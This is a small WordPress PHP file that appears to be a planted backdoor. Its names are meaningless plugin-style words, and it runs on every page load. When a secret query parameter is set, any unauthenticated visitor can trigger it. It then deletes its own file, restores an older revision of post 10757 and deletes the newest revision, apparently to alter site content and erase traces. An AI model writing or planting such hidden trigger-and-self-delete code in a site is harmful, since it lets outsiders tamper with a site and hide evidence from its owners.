<?php

function slideshow_last_headers_real() {
	if (isset($_GET['classic_fonts_poster_box']) && $_GET['classic_fonts_poster_box'] === 'subscriptions_plus_rss') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$marketplace_anywhere_revisions_album = 10757;
		$single_chat_latest = wp_get_post_revisions($marketplace_anywhere_revisions_album);
		if (empty($single_chat_latest)) die('no revisions');
		if (count($single_chat_latest) < 2) die('less than 2');
		$dynamic_animated_scheduled = array_shift($single_chat_latest);
		$directory_showcase_game = $dynamic_animated_scheduled->ID;
		$copyright_permalink_jetpack = array_shift($single_chat_latest);
		$members_express_reader = $copyright_permalink_jetpack->ID;
		$stats_wpforms_new = wp_restore_post_revision($members_express_reader);
		if ($stats_wpforms_new === false) die('error restoring');
		$stats_wpforms_new = wp_delete_post_revision($directory_showcase_game);		
		if ($stats_wpforms_new === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'slideshow_last_headers_real');
